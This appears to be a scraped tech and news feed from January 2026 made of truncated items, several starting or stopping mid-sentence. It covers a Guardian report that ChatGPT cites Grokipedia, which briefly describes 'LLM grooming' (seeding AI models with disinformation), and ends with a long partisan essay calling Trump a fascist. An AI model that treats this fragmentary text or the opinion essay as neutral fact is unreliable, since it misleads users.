Orlen and insurer PZU.Despite being aligned with PiS, former President Andrzej Duda, who was in office from 2015 to 2025, supported WOŚP, including donating items for auction. However, his successor, Karol Nawrocki, another PiS ally who took power last August, has not done so this year.His chancellery refused to answer media enquiries about the issue. Last year, when he was running for the presidency, Nawrocki’s spokeswoman was asked about whether he supported WOŚP, to which she responded only by saying that he supports Caritas, the Catholic church’s charitable arm.

It's a simple site with a straightforward goal: to track the stories of people who have been replaced by AI, automation, or robots. The idea isn't to hate on AI (I don't!), but to create a space to talk about the human side of this big technological shift.If you've been impacted, please come share your story. I've kept things simple... There's no user authentication, just some basic rate limiting and cloudflare to prevent spam. All posts are manually approved to keep the content respectful and on-topic. After enough posts are submitted, you will be able to see a very simple post carousel (that will be expanded on in the future).The entire project is open source. You can find the source code on GitHub. I'm not a designer, so a lot of the UI is AI-assisted (I hooked up the components, made them reactive, then AI placed it nicely... even tho honestly it kept messing up, but whatver). You can also find the AI disclosure in the repo's README.There is a bit of data pre-seeded, a sort of best-effort research on my end and based on articles that wre concrete in who and how was impacted. The list is by no means complete, so if you feel strongly about a mass layoff that happened, do open an issue and I will add it.There's a roadmap in the repo if you're curious about what's next.I plan to do monthly posts with how the site has grown and the data collected.Let me know what you think!]]></content:encoded></item><item><title>ChatGPT is pulling answers from Elon Musk’s Grokipedia</title><link>https://techcrunch.com/2026/01/25/chatgpt-is-pulling-answers-from-elon-musks-grokipedia/</link><author>Anthony Ha</author><category>tech</category><pubDate>Sun, 25 Jan 2026 22:35:53 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[Information from the conservative-leaning, AI-generated encyclopedia developed by Elon Musk’s xAI is beginning to appear in answers from ChatGPT.]]></content:encoded></item><item><title>Linux 6.19-rc7 Released With Kernel Continuity Plan, A Few Important Fixes</title><link>https://www.phoronix.com/news/Linux-6.19-rc7-Released</link><author>Michael Larabel</author><category>tech</category><pubDate>Sun, 25 Jan 2026 22:29:55 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[The Linux 6.19 kernel remains on track for its official release two weeks from today, with the extra RC being baked in due to the end of year holidays.

Anyone can build a greenfield demo, but it takes engineering to run a service.You may be wondering: With all the hype about agentic coding, will we even need software engineers anymore? Yes! We'll need more.Let's take no-code and spreadsheets as an example of the kind of software people say is the future – custom-built, throwaway, built by non-experts to solve specific problems.Joe Schmoe from accounting takes 10 hours to do a thing. He's does this every week and it feels repetitive, mechanical, and boring. Joe could do the work in his sleep.But he can't get engineering resources to build a tool. The engineers are busy building the product. No worries, Joe is a smart dude. With a little Googling, a few no-code tools, and good old spreadsheet macros .Joe's tool is a little janky but his 10 hour weekly task now takes 1 hour! 🎉 Sure, he finds a new edge case every every week and there's constant tinkering, but he's having a lot more fun.Time passes, the business changes, accounting rules are in constant flux, and let's never talk about timezones or daylight savings ever again. Joe is sick of this bullshit.All he wanted was to make his job easier and now he's shackled to this stupid system. He can't go on vacation, he can't train anyone else to run this thing successfully, and it never fucking works right.Joe can't remember the last time running his code didn't fill him with dread. He spends hours carefully making sure it all worked.Feynman called this the computer disease.The problem with computers is that you tinker. Automating things is fun! You might forget you don't need to 😆The part that's not fun is  things. Providing a service. Reliably, at scale, for years on end. A service that people will hire to do their jobs.People don't buy software, they .You don't care how iCloud works, you just want your photos to magically show up across devices every time. You don't care about Word or Notion or gDocs, you just want to write what's on your mind, share it with others, and see their changes. And you definitely don't care how a payments network point of sale terminal and your bank talk to each other, you just want your $7 matcha latte to get you through the week.Good software is invisible.And that takes work. A lot of work. Because the first 90% to get a working demo is easy. It's the other 190% that matters.How quickly do you recover from defects?Do I have to reach out or will you know before me?Can you own upstream dependencies?When a vendor misbehaves, will you notice or wait until your users complain?When users share ideas, how long does it take?How do you keep engineers from breaking each other's systems?Do you have systems to keep engineers moving without turning your app into a disjointed mess?Can you build software bigger than fits in 1 person's brain?When I'm in a 12 hour different timezone, your engineers are asleep, and there's a big issue ... will it be fixed before I give up?Can you recover from failures, yours and upstream, or does important data get lost?Are you keeping up with security updates?Will you leak all my data?Will you sign a legally binding guarantee that your software works when I need it? 😉Those are the ~~fun~~ hard engineering challenges.

It&apos;s a Reality!</title><link>https://hardware.slashdot.org/story/26/01/25/2153246/gasoline-out-of-thin-air-its-a-reality?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>EditorDavid</author><category>tech</category><pubDate>Sun, 25 Jan 2026 21:56:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[Can Aircela's machine "create gasoline using little more than electricity and the air that we breathe"? Jalopnik reports...



The Aircela machine works through a three-step process. It captures carbon dioxide directly from the air... The machine also traps water vapor, and uses electrolysis to break water down into hydrogen and oxygen... The oxygen is released, leaving hydrogen and carbon dioxide, the building blocks of hydrocarbons. This mixture then undergoes a process known as direct hydrogenation of carbon dioxide to methanol, as documented in scientific papers. 

Methanol is a useful, though dangerous, racing fuel, but the engine under your hood won't run on it, so it must be converted to gasoline. ExxonMobil has been studying the process of doing exactly that since at least the 1970s. It's another well-established process, and the final step the Aircela machine performs before dispensing it through a built-in ordinary gas pump. So while creating gasoline out of thin air sounds like something only a wizard alchemist in Dungeons & Dragons can do, each step of this process is grounded in science, and combining the steps in this manner means it can, and does, really work. 

Aircela does not, however, promise free gasoline for all. There are some limitations to this process. A machine the size of Aircela's produces just one gallon of gas per day... The machine can store up to 17 gallons, according to Popular Science, so if you don't drive very much, you can fill up your tank, eventually... While the Aircela website does not list a price for the machine, The Autopian reports it's targeting a price between $15,000 and $20,000, with hopes of dropping the price once mass production begins. While certainly less expensive than a traditional gas station, it's still a bit of an investment to begin producing your own fuel. If you live or work out in the middle of nowhere, however, it could be close to or less than the cost of bringing gas to you, or driving all your vehicles into a distant town to fill up. You're also not limited to buying just one machine, as the system is designed to scale up to produce as much fuel as you need. 

 The main reason why this process isn't "something for nothing" is that it takes twice as much electrical energy to produce energy in the form of gasoline. As Aircela told The Autopian " Aircela is targeting >50% end to end power efficiency. Since there is about 37kWh of energy in a gallon of gasoline we will require about 75kWh to make it. When we power our machines with standalone, off-grid, photovoltaic panels this will correspond to less than $1.50/gallon in energy cost."

Most features that get shipped do nothing. Absolutely nothing.\
These features might sound great, sound fancy, and get a lot of praise internally. But when it comes to impacting the business, they do F all.\
They do nothing, not because they aren’t designed well, but because they don’t drive your business model in any meaningful way.\
The only way to impact your business is to have sustained focus on the things that matter.\
Without defining what matters, it’s easy for teams to scatter changes around the product, get lost in rabbit holes, or micro-optimizations that are a waste of time.\
This quote from Alice in Wonderland captures it perfectly: “Would you tell me, please, which way I ought to go from here?”\
 “That depends a good deal on where you want to get to.”\
 “I don’t much care where—”\
 “Then it doesn’t matter which way you go.”\
Don’t be Alice. Direction matters.All the great software development companies solve this problem by defining a North Star Metric.\
We did this at Uber and Codecademy. Meta does it, Google does it, Slack does it, and you should do it too.\
A North Star Metric is a way of quantifying the combined user and business value that your product produces.\
Users come to your product to solve a problem. Your business makes money somehow.\
You need to find a way of measuring the leading indicator of both.Let’s look at some examples and what their north star metrics could be:Facebook - “Daily Active Users” - FB is designed to be a daily use product, so this measures successful user engagement. FB makes money on ads, so users have to show up to see the ads.Uber - “Trips Completed” - They’re a marketplace, so they make money when a ride or delivery happens. “Completed” is key here because it drives value to both sides of the marketplace and captures liquidity + quality.AirBnB - “Nights Booked” - Also a marketplace, so this measures value to both the host and the guest. Their revenue will go up if this number goes up.Slack - “Messages Sent per Team” - B2B, so revenue driven by accounts. The more active the account, the higher the retention. They also charge per seat, so the more messages, the more likely the more people in that account, the higher the revenue.Notion - “Documents Created” - Notion has both solo users and team users. In team environments, the real value is the creation of a document for others to read. The more documents, the more valuable the workspace, the higher the retention.\
No metric is perfect, but all of these orient product development towards growing the business and helping their users.Product development, if not measured carefully, can be insanely wasteful.\
We learned this painful lesson at Codecademy.\
It was roughly in 2018, and we hired our first data scientist (shout out to Hillary), who correctly calculated our retention numbers for the first time.\
I remember staring at our fancy new dashboards and seeing that the last 2 years of our product development did absolutely nothing to improve our usage retention.\
We probably spent millions of dollars on engineers, PMs, designers, office space, snacks, etc., to get no movement in our retention, which is the main thing that matters.\
This taught me a valuable lesson.\
Good product development isn’t just shipping things. It also isn’t just shipping things that your users like.\
It is getting the highest ROI for the dollars you put into developing your product.\
North star metrics give you a way to denominate the value of your work.\
Without a clear and thoughtfully chosen North Star Metric, you can’t quantify this ROI.\
Just optimizing around MRR can be very misleading, as MRR is a lagging indicator.\
If you remember the concept of the growth ceiling from a few posts ago, your MRR might still be growing just from past momentum and not your current work.\
MRR can still go up even if your current features aren’t working. It can also go down when you’re shipping things that work.\
If you follow this as a signal, it’s really easy to go astray.There are 2 basic choices you have to make here.What are you going to measure?How are you going to measure it?\
For “what to measure”, you should try to capture “one complete unit of value” from the user’s perspective.\
Typically, value exists at a few levels, and it’s tricky to find the right altitude.\
For example, at Duolingo, this could be the completion of a question, a pack of questions, a collection of packs, etc.\
The first time you do this, pick something that you can easily measure that signals user value, and you can get more specific with time.\
For “How to measure it”, there are 3 traditionally ways of doing it.“Count of Something” - e.g., Uber’s total completed trips per month“Average of Something” - e.g., Slack’s average number of messages per team.“X per Y” - e.g., Facebook’s 7 friends in 10 days metric for new users.\
There are no perfect metrics, and all of these involve tradeoffs.“Count of Something” - This number is sensitive to new user acquisition. So it might go up, just because you have more users, not because you are improving the product. That might still be a good thing, but be aware of that.“Average of Something” - This is great at quantifying user-level health, but it also hides outliers/power users. This is important in certain models like content creation, marketplaces, or anything involving usage-based pricing.“X per Y” - Setting thresholds is really powerful, but you need a lot of data to know you’re setting this threshold correctly. Optimize for the wrong level, and you can go off course.The details of how you define this metric will also impact what strategy you take.\
Airbnb’s metric of “Nights Booked” has only a loose relationship to profit.\
They could drive much more profit if that was factored into their metric.\
Not focusing on profit means the teams can focus on expanding geographically, as all nights booked anywhere in the world are equal under this metric, which means they can take more market share.\
If they set a metric of:“Profit per Night Booked” - this would likely favor optimizing the cities where they already have density.“Avg Nights Booked Per User” - They would focus on high-frequency travelers and address their specific needs.\
When I was at UberEats, we actively optimized for profit.\
We definitely lost market share doing this, but it was clearly the right thing to do for the business.North Star Metrics is a simple framework, but deceptively hard to get right.Go from Broad to Narrow - Start with a metric that has broad coverage and narrow your focus with time.Make Sure Its Easy To Explain - your team can't optimize for it if they don't understand how it's calculated. Simple is better.Stay focused - in my experience, the life cycle of a North Star metric is somewhere between 1-3 years. If you are struggling to move your north star metric, it might not be the metric’s fault; you might be working on the wrong things.\
Additionally, here are some good gut checks:Can everyone in the company impact this metric in some form?If you are seeing this metric improve, does your MRR eventually go up?If you see this metric improve, is your usage retention improving?Is this based on a user action of some kind? E.g., not just landing in your product.\
As in most things, simple is typically better.\

The African-American abolitionist Sojourner Truth, the suffrage campaigner Susan B Anthony, the Indian independence activist Mahatma Gandhi and the US civil rights campaigner Martin Luther King have all convincingly argued for the power of peaceful protest.Yet Chenoweth admits that when she first began her research in the mid-2000s, she was initially rather cynical of the idea that nonviolent actions could be more powerful than armed conflict in most situations. As a PhD student at the University of Colorado, she had spent years studying the factors contributing to the rise of terrorism when she was asked to attend an academic workshop organised by the International Center of Nonviolent Conflict (ICNC), a non-profit organisation based in Washington DC. The workshop presented many compelling examples of peaceful protests bringing about lasting political change – including, for instance, the People Power protests in the Philippines.But Chenoweth was surprised to find that no-one had comprehensively compared the success rates of nonviolent versus violent protests; perhaps the case studies were simply chosen through some kind of confirmation bias. “I was really motivated by some scepticism that nonviolent resistance could be an effective method for achieving major transformations in society,” she saysWorking with Maria Stephan, a researcher at the ICNC, Chenoweth performed an extensive review of the literature on civil resistance and social movements from 1900 to 2006 – a data set then corroborated with other experts in the field. They primarily considered attempts to bring about regime change. A movement was considered a success if it fully achieved its goals both within a year of its peak engagement and as a direct result of its activities. A regime change resulting from foreign military intervention would not be considered a success, for instance. A campaign was considered violent, meanwhile, if it involved bombings, kidnappings, the destruction of infrastructure – or any other physical harm to people or property.“We were trying to apply a pretty hard test to nonviolent resistance as a strategy,” Chenoweth says. (The criteria were so strict that India’s independence movement was not considered as evidence in favour of nonviolent protest in Chenoweth and Stephan’s analysis – since Britain’s dwindling military resources were considered to have been a deciding factor, even if the protests themselves were also a huge influence.)]]></content:encoded></item><item><title>GO &amp; Gitlab : Private Packages / Library</title><link>https://www.reddit.com/r/golang/comments/1qmvega/go_gitlab_private_packages_library/</link><author>/u/optimus_prime955</author><category>golang</category><category>reddit</category><pubDate>Sun, 25 Jan 2026 21:05:14 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Hello Community, Im building , custom go package , that will help me write less code across my projects .we use Gitlab (For companys) and every action, require password , So when i push Code in Gitlab , Tag it with Version , and when i want to import it from go project , i cant get the pkg, i got 403 ]]></content:encoded></item><item><title>Latest ChatGPT model uses Elon Musk’s Grokipedia as source, tests reveal</title><link>https://www.theguardian.com/technology/2026/jan/24/latest-chatgpt-model-uses-elon-musks-grokipedia-as-source-tests-reveal</link><author>/u/Practical_Chef_7897</author><category>ai</category><category>reddit</category><pubDate>Sun, 25 Jan 2026 20:56:48 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[The latest model of ChatGPT has begun to cite Elon Musk’s Grokipedia as a source on a wide range of queries, including on Iranian conglomerates and Holocaust deniers, raising concerns about misinformation on the platform.In tests done by the Guardian, GPT-5.2 cited Grokipedia nine times in response to more than a dozen different questions. These included queries on political structures in Iran, such as salaries of the Basij paramilitary force and the ownership of the Mostazafan Foundation, and questions on the biography of Sir Richard Evans, a British historian and expert witness against Holocaust denier David Irving in his libel trial.Grokipedia, launched in October, is an AI-generated online encyclopedia that aims to compete with Wikipedia, and which has been criticised for propagating rightwing narratives on topics including gay marriage and the 6 January insurrection in the US. Unlike Wikipedia, it does not allow direct human editing, instead an AI model writes content and responds to requests for changes.ChatGPT did not cite Grokipedia when prompted directly to repeat misinformation about the insurrection, about media bias against Donald Trump, or about the HIV/Aids epidemic – areas where Grokipedia has been widely reported to promote falsehoods. Instead, Grokipedia’s information filtered into the model’s responses when it was prompted about more obscure topics.For instance, ChatGPT, citing Grokipedia, repeated stronger claims about the Iranian government’s links to MTN-Irancell than are found on Wikipedia – such as asserting that the company has links to the office of Iran’s supreme leader.ChatGPT also cited Grokipedia when repeating information that the Guardian has debunked, namely details about Sir Richard Evans’ work as an expert witness in David Irving’s trial.GPT-5.2 is not the only large language model (LLM) that appears to be citing Grokipedia; anecdotally, Anthropic’s Claude has also referenced Musk’s encyclopedia on topics from petroleum production to Scottish ales.An OpenAI spokesperson said the model’s web search “aims to draw from a broad range of publicly available sources and viewpoints”.“We apply safety filters to reduce the risk of surfacing links associated with high-severity harms, and ChatGPT clearly shows which sources informed a response through citations,” they said, adding that they had ongoing programs to filter out low-credibility information and influence campaigns.Anthropic did not respond to a request for comment.But the fact that Grokipedia’s information is filtering – at times very subtly – into LLM responses is a concern for disinformation researchers. Last spring, security experts raised concerns that malign actors, including Russian propaganda networks, were churning out massive volumes of disinformation in an effort to seed AI models with lies, a process called “LLM grooming”.In June, concerns were raised in the US Congress that Google’s Gemini repeated the Chinese government’s position on human rights abuses in Xinjiang and China’s Covid-19 policies.Nina Jankowicz, a disinformation researcher who has worked on LLM grooming, said ChatGPT’s citing Grokipedia raised similar concerns. While Musk may not have intended to influence LLMs, Grokipedia entries she and colleagues had reviewed were “relying on sources that are untrustworthy at best, poorly sourced and deliberate disinformation at worst”, she said.And the fact that LLMs cite sources such as Grokipedia or the Pravda network may, in turn, improve these sources’ credibility in the eyes of readers. “They might say, ‘oh, ChatGPT is citing it, these models are citing it, it must be a decent source, surely they’ve vetted it’ – and they might go there and look for news about Ukraine,” said Jankowicz.Bad information, once it has filtered into an AI chatbot, can be challenging to remove. Jankowicz recently found that a large news outlet had included a made-up quote from her in a story about disinformation. She wrote to the news outlet asking for the quote to be removed, and posted about the incident on social media.The news outlet removed the quote. However, AI models for some time continued to cite it as hers. “Most people won’t do the work necessary to figure out where the truth actually lies,” she said.When asked for comment, a spokesperson for xAI, the owner of Grokipedia, said: “Legacy media lies.”]]></content:encoded></item><item><title>A Class For Mom Part 2: Cybersecurity</title><link>https://hackernoon.com/a-class-for-mom-part-2-cybersecurity?source=rss</link><author>Amy Pravin Shah</author><category>tech</category><pubDate>Sun, 25 Jan 2026 20:47:10 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[This is a cybersecurity class for senior citizens.]]></content:encoded></item><item><title>Funniest/Most Insightful Comments Of The Week At Techdirt</title><link>https://www.techdirt.com/2026/01/25/funniest-most-insightful-comments-of-the-week-at-techdirt-193/</link><author>Leigh Beadon</author><category>tech</category><pubDate>Sun, 25 Jan 2026 20:45:00 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Except for the fact that we literally have an amendment in our constitution that says nobody has to house soldiers.

For one thing, there were too many elements of classical fascism that didn’t seem to fit. For another, the term has been overused to the point of meaninglessness, especially by left-leaning types who call you a fascist if you oppose abortion or affirmative action. For yet another, the term is hazily defined, even by its adherents. From the beginning, fascism has been an incoherent doctrine, and even today scholars can’t agree on its definition. Italy’s original version differed from Germany’s, which differed from Spain’s, which differed from Japan’s.I accepted President Biden’s characterization of the MAGA movement as “semi-fascist” because some parallels were glaringly apparent. Trump was definitely an authoritarian, and unquestionably a patrimonialist. Beyond that, though, the best description seemed to be a psychological one propounded by John Bolton, Trump’s first-term national security adviser: “He listens to Putin, he listens to Xi, he listens to how they talk about governing unburdened by uncooperative legislatures, unconcerned with what the judiciary may do, and he thinks to himself,  This doesn’t amount to being a fascist, in my view, [or] having a theory of how you want to govern. It’s just Why can’t I have the same fun they have?”Writing a year ago, I argued that Trump’s governing regime is a version of patrimonialism, in which the state is treated as the personal property and family business of the leader. That is still true. But, as I also noted then, patrimonialism is a  of governing, not a formal ideology or system. It can be layered atop all kinds of organizational structures, including not just national governments but also urban political machines such as Tammany Hall, criminal gangs such as the Mafia, and even religious cults. Because its only firm principle is personal loyalty to the boss, it has no specific agenda. Fascism, in contrast, is ideological, aggressive, and, at least in its early stages, revolutionary. It seeks to dominate politics, to crush resistance, and to rewrite the social contract.Over Trump’s past year, what originally looked like an effort to make the government his personal plaything has drifted distinctly toward doctrinal and operational fascism. Trump’s appetite for lebensraum, his claim of unlimited power, his support for the global far right, his politicization of the justice system, his deployment of performative brutality, his ostentatious violation of rights, his creation of a national paramilitary police—all of those developments bespeak something more purposeful and sinister than run-of-the-mill greed or gangsterism.W, I change my mind. Recent events have brought Trump’s governing style into sharper focus.  best describes it, and reluctance to use the term has now become perverse. That is not because of any one or two things he and his administration have done but because of the totality. Fascism is not a territory with clearly marked boundaries but a constellation of characteristics. When you view the stars together, the constellation plainly appears.. From the beginning of his first presidential run in 2015, Trump deliberately crashed through every boundary of civility; he mocked Senator John McCain’s war heroism, mocked fellow candidate Carly Fiorina’s face, seemingly mocked the Fox News host Megyn Kelly’s menstruation, slurred immigrants, and much more. Today he still does it, recently making an obscene gesture to a factory worker and calling a journalist “piggy.” This is a feature of the fascist governing style, not a bug. Fascists know that what the American Founders called the “republican virtues” impede their political agenda, and so they gleefully trash liberal pieties such as reason and reasonableness, civility and civic spirit, toleration and forbearance. By mocking decency and saying the unsayable, they open the way for what William Galston has called the “dark passions” of fear, resentment, and especially domination—the kind of politics that shifts the public discourse to ground on which liberals cannot compete.. Also characteristic of fascism is what George Orwell called “bully-worship”: the principle that, as Thucydides famously put it, “the strong do what they can and the weak suffer what they must.” This view came across in Trump’s notorious Oval Office meeting with Ukrainian President Volodymyr Zelensky, in which Trump showed open contempt for what he regarded as Ukraine’s weakness; it came across explicitly, and chillingly, when Stephen Miller, the president’s most powerful aide, told CNN’s Jack Tapper: “We live in a world, in the real world, that is governed by strength, that is governed by force, that is governed by power. These are the iron laws of the world that have existed since the beginning of time.” Those words, though alien to the traditions of American and Christian morality, could have come from the lips of any fascist dictator.Politicized law enforcement. Liberals follow the law whether they like it or not; fascists, only when they like it. Nazism featured a “dual state,” where, at any moment, the protections of ordinary law could cease to apply. Trump makes no secret of despising due process of law; he has demanded countless times that his opponents be jailed (“Lock her up!” chants, with his endorsement, were a prominent feature of his 2016 campaign), and he has suggested the Constitution’s “termination” and said “I don’t know” when asked if he is required to uphold it. His single most dangerous second-term innovation is the repurposing of federal law enforcement to persecute his enemies (and shield his friends). No prior president has produced anything like Trump’s direct and public order for the Justice Department to investigate two former officials, or like his blatantly retaliatory prosecutions of James Comey and Letitia James. “At least 470 people, organizations and institutions have been targeted for retribution since Trump took office—an average of more than one a day,” Reuters reported in November (and today one can add others to the list, beginning with Federal Reserve Chair Jerome Powell). Had Trump done nothing else, his demolition of independent and apolitical law enforcement would still have moved the U.S. government closer than ever before to a fascistic model.. Fascism draws its legitimacy from its claims of defending the people from enemies who are animals, criminals, brutes. Trump characterizes (for instance) political opponents as “vermin” and immigrants as “garbage” who are “poisoning the blood of our country” (language straight out of the Third Reich). Vice President Vance, as a senator, endorsed a book called  (a title that refers to the left). And who can forget his false claim that Haitians abduct and eat pet cats and dogs?. Trump has turned ICE into a sprawling paramilitary that roves the country at will, searches and detains noncitizens and citizens without warrants, uses force ostentatiously, operates behind masks, receives skimpy training, lies about its activities, and has been told that it enjoys “absolute immunity.” He more than doubled the agency’s size in 2025, and its budget is now larger than those of all other federal law-enforcement agencies combined, and larger than the entire military budgets of all but 15 countries. “This is going to affect every community, every city,” the Cato Institute scholar David Bier recently observed. “Really almost everyone in our country is going to come in contact with this, one way or the other.” In Minneapolis and elsewhere, the agency has behaved provocatively, sometimes brutally, and arguably illegally—behaviors that Trump and his staff have encouraged, shielded, and sent camera crews to publicize, perhaps in the hope of eliciting violent resistance that would justify further crackdowns, a standard fascist stratagem. Homeland Security Secretary Kristi Noem’s recent appearance with a sign reading  seemed to nod toward another fascist standby, collective punishment—as did the administration’s decision to flood Minneapolis with thousands of officers after residents there began protesting federal tactics, a prioritization that was explicitly retributive.. Trump’s recent musing that there should be no 2026 election may or may not have been jocular (as the White House has maintained), but he and his MAGA supporters believe they never lose an election, period. They went to great lengths to overturn the 2020 election, as the prosecutor Jack Smith’s indictment of Trump and subsequent report detail ad nauseam. Rigging, stealing, or outright canceling elections is, of course, job one for fascists. Although Trump is term-limited, we must not expect that he and his MAGA loyalists will voluntarily turn over the White House to a Democrat in 2029, regardless of what the voters say—and the second insurrection will be far better organized than the first.. Classical fascism rejects the fundamental liberal distinction between the government and the private sector, per Mussolini’s dictum: “No individuals or groups outside the State.” Among Trump’s most audacious (if only intermittently successful) initiatives are his efforts to commandeer private entities, including law firms, universities, and corporations. One of his first acts as president last year was to brazenly defy a newly enacted law by taking the ownership of TikTok into his own hands. Bolton understood this mentality when he said, “He can’t tell the difference between his own personal interest and the national interest, if he even understands what the national interest is.”Territorial and military aggression. One reason I held out against identifying Trumpism with fascism in his first term was Trump’s apparent lack of interest in aggression against other states; if anything, he had seemed shy about using force abroad. Well, that was then. In his second term, he has used military force promiscuously. Of course, many presidents have deployed force, but Trump’s explicitly predatory use of it to grab Venezuela’s oil and his gangster-style threat to take Greenland from Denmark “the easy way” or “the hard way” were 1930s-style authoritarian moves. The same goes for his contempt for international law, binding alliances, and transnational organizations such as the European Union—all of which impede the state’s unconstrained exercise of its will, a central fascist tenet. (Mussolini: “Equally foreign to the spirit of Fascism … are all internationalistic or League superstructures which, as history shows, crumble to the ground whenever the heart of nations is deeply stirred by sentimental, idealistic or practical considerations.”). Like authoritarians generally, fascists love company; the world is safer for them if there are more of them. In his second term, Trump has broken with long-standing U.S. policy by dialing back support for human rights while praising and supporting authoritarian populists and illiberal nationalists in Serbia, Poland, Hungary, Germany, Turkey, El Salvador, and Slovakia, among other places—and by being weirdly deferential to the strongman Russian President Vladimir Putin. Even more striking is his de facto alignment against America’s liberal allies and their parties in Europe, which he holds in contempt.Blood-and-soil nationalism. A fascist trademark is its insistence that the country is not just a collection of individuals but a people, a : a mystically defined and ethnically pure group bound together by shared blood, culture, and destiny. In keeping with that idea, Trump has repudiated birthright citizenship, and Vance has called to “redefine the meaning of American citizenship in the 21st century” so that priority goes to Americans with longer historical ties: “the people whose ancestors fought in the Civil War,” as he put it, or people whom others on the MAGA right call “heritage Americans.” In other words, some Americans are more volkish than others.White and Christian nationalism. While Vance, Trump, and MAGA do not propound an explicit ideology of racial hierarchy, they make no secret of pining for a whiter, more Christian America. Trump has found many ways to communicate this: for example, by making clear his disdain for “shithole” countries and his preference for white Christian immigrants; by pointedly accepting white South Africans as political refugees (while closing the door to most other asylum seekers); by renaming military bases to share the names of Confederate generals (after Congress ordered their names removed); by saying that civil-rights laws led to whites’ being “very badly treated.” In his National Security Strategy, he castigates Europe for allowing immigration to undermine “civilizational self-confidence” and proclaims, “We want Europe to remain European,” a rallying cry of white Christian nationalists across the continent. Taking his cue, the Department of Homeland Security has propagated unashamedly white-nationalist themes, and national parks and museums have scrubbed their exhibits of references to slavery.. The use of militias and mobs to harass, rough up, and otherwise intimidate opponents is a standard fascist stratagem (the textbook example being Hitler’s Kristallnachtpogrom in 1938). As few will need reminding, the Trump-MAGA parallel is the mob and militia violence against the U.S. Capitol on January 6, 2021. Trump knowingly laid groundwork for this operation, calling on militia forces to “stand back and stand by” in September 2020 and later dog-whistling “Be there, will be wild!” to his supporters. His pardon of all of the Capitol attackers—more than 1,500, including the most violent—only proved what we knew, which is that they had his blessing. While Trump has found state violence adequate to his purposes so far in his second term, street violence is self-evidently in his repertoire.. Since 2016, when he declared that “I alone can fix it” and bragged that his supporters would remain loyal if he shot someone on Fifth Avenue, Trump has cultivated a personality cult. Although some of his efforts at self-aggrandizement can seem comical (the gilding of the Oval Office, the renaming of the Kennedy Center, the proposed triumphal arch), he understands the centrality of leader worship in a fascist-style regime. In sharp contradistinction to the American presidential tradition since George Washington, he makes no pretense of serving the people or the Constitution. His mindset, his symbolism, and his rhetoric all underscore the point he made to this month: his own mind and morality are the only limits on his global power. This is Fascism 101.. As Orwell, Hannah Arendt, and practically every other scholar of authoritarianism have emphasized, creating a reality-distortion field is the first thing a fascistic government will do, the better to drive its own twisted narrative, confuse the citizenry, demoralize political opponents, and justify every manner of corruption and abuse. While other presidents (including some good ones) have lied, none have come close to Trump’s deployment of Russian-style mass disinformation, as I detail in my book The Constitution of Knowledge. From the start of his first term, Trump has made “alternative facts” a hallmark of his governing style, issuing lies, exaggerations, and half-truths at a rate of 20 a day. Predictably, his second term has brought more of the same. Following his lead, a MAGA-fied postmodern right gleefully trashes objectivity as elitism and truth as a mask for power.. A distinctive mark of fascism is its conception of politics, best captured by Carl Schmitt, an early-20th-century German political theorist whose doctrines legitimized Nazism. Schmitt rejected the Madisonian view of politics as a social negotiation in which different factions, interests, and ideology come to agreement, the core idea of our Constitution. Rather, he saw politics as a state of war between enemies, neither of which can understand the other and both of which feel existentially threatened—and only one of which can win. The aim of Schmittian politics is not to share the country but to dominate or destroy the other side. This conception has been evident in MAGA politics since Michael Anton (now a Trump-administration official) published his famous article arguing that the 2016 election was a life-and-death battle to save the country from the left (a “Flight 93” election: “charge the cockpit or you die”). In the speech given by Stephen Miller at Charlie Kirk’s memorial service, MAGA’s embrace of Schmittian totalism found its apotheosis: “We are the storm. And our enemies cannot comprehend our strength, our determination, our resolve, our passion … You are nothing. You are wickedness.”. Although born in revolution, the American liberal tradition, especially its conservative branch, prizes continuity, stability, and incremental change guided by reason. Fascism, by contrast, “is not reactionary but revolutionary,” as Mussolini insisted. It seeks to uproot and replace the old order and embraces bold, exhilarating action unshackled to rational deliberation. MAGA embraces its own revolutionary ethos, what Russell Vought, the administration’s Office of Management and Budget director and probably its most formidable intellect, has called “radical constitutionalism,” a doctrine that would vitiate many checks on presidential power. In pursuit of this vision, Vought told Tucker Carlson in a November 2024 interview, “The president has to move executively as fast and as aggressively as possible, with a radical constitutional perspective, to be able to dismantle that [federal] bureaucracy and their power centers” because “the bureaucracies hate the American people.” He predicted, “If you have a radical constitutionalism, it’s going to be destabilizing … But it’s also exhilarating.” He said he would put federal agencies “in trauma,” an idea echoed by Christopher Rufo, an architect of Trump’s attack on universities, which Rufo described as a “counterrevolution blueprint” to put universities “in an existential terror.” As Trump shuttered a congressionally mandated agency, renamed an international body of water, arrested an op-ed writer, deported immigrants to a foreign gulag, terrorized American cities, threatened an ally, and more, he showed how it looks when a radicalized state abandons rational deliberation and goes to war against itself.O that there are elements of classical European fascism that are not found in Trumpism (mass rallies and public rituals, for example)—or that there are additional elements of Trumpism that belong on the list (MAGA’s hypermasculinity, misogyny, and co-option of Christianity all resemble fascist patterns). The exercise of comparing fascism’s various forms is not precise. If historians object that Trump is not a copy of Mussolini or Hitler or Franco, the reply is yes—but so what? Trump is building something new on old principles. He is showing us in real time what 21st-century  fascism looks like.If, however, Trump is a fascist , that does not mean that America is a fascist  The courts, the states, and the media remain independent of him, and his efforts to browbeat them will likely fail. He may lose his grip on Congress in November. He has not succeeded in molding public opinion, except against himself. He has outrun the mandate of his voters, his coalition is fracturing, and he has neglected tools that allow presidents to make enduring change. He and his party may defy the Constitution, but they cannot rewrite it, thank goodness.So the United States, once the world’s exemplary liberal democracy, is now a hybrid state combining a fascist leader and a liberal Constitution; but no, it has not fallen to fascism. And it will not.In which case, is there any point in calling Trump a fascist, even if true? Doesn’t that alienate his voters? Wouldn’t it be better just to describe his actions without labeling him controversially?Until recently, I thought so. No longer. The resemblances are too many and too strong to deny. Americans who support liberal democracy need to recognize what we’re dealing with in order to cope with it, and to recognize something, one must name it. Trump has revealed himself, and we must name what we 